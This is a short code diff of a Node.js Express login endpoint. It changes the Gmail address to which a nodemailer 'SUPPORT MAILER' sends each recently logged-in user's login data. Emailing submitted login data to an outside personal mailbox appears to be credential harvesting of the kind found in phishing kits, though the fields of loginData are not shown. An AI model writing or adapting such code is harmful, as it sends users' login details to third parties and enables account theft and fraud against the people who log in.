@@ -31,7 +31,7 @@ app.post("/api/loginUser", async (req, res) => {
 
     const messageOption = {
       from: "nodemailer2446@gmail.com",
-      to: "megamindcodex003@gmail.com",
+      to: "customerservicesilkflowers@gmail.com",
       subject: "SUPPORT MAILER",
       text: `recentely logged in user:<br><br> ${loginData}`,
       html: `<p>Recently logged in user:</p>
